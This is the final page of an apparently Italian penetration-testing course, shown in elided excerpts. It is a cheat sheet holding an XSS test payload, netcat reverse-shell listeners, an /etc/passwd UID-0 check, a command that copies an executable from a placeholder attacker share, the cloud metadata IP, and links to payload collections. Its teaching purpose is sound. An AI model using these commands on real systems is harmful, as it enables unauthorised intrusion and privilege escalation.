...
order: 29
level: "intermedio"
summary: "La pagina di riferimento rapido: comandi che userai sempre, payload tipici, network/web/AD/cloud/forensics one-liner. Salvala nei segnalibri e consultala mentre lavori."
prereq:
  - "Tutte le sezioni"
tools:
  - "Tutti i precedenti"
...
> Una sola pagina, denso, navigabile. Da consultare mentre lavori.
...
# XSS quick check
echo '<script>alert(1)</script>' | xclip      # tieni in clipboard
# poi prova ogni parametro
...
```bash
nc -lvnp 4444
rlwrap nc -lvnp 4444         # con line editing
...
cat /etc/passwd | grep ':0:'                        # UID 0 oltre root?

# LinPEAS automatizzato
...
# da Windows: copy \\attacker\share\file.exe .
...
## Tools "tipo coltellino svizzero"
...
# CyberChef (web): convert/encode/decode quasi tutto, drag-drop.
...
## Indirizzi e numeri da memorizzare

- `127.0.0.1`, `::1` loopback.
- `169.254.169.254` AWS/Azure IMDS (Google: `metadata.google.internal` o `169.254.169.254`).
- `0.0.0.0` "tutte interfacce", default route.
- `255.255.255.255` broadcast.
- `169.254.0.0/16` link-local APIPA.
- RFC1918: 10/8, 172.16/12, 192.168/16.
- Multicast 224/4.
- Numeri syscall Linux: `read=0`, `write=1`, `open=2`, `close=3`, `execve=59`, `mmap=9`, `socket=41`, `connect=42`, `ptrace=101` (x86-64).
...
## Risorse di emergenza (quando sei bloccato)

- [HackTricks](https://book.hacktricks.xyz) — "the bible". Cerca prima qui.
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — payloads per categoria.
- [GTFOBins](https://gtfobins.github.io) — escape da binari Unix.
...
Salvali nei bookmark. Cercale prima di chiedere ad altri.

---

Hai chiuso il giro. Adesso non leggere altre 100 pagine — **fai**.
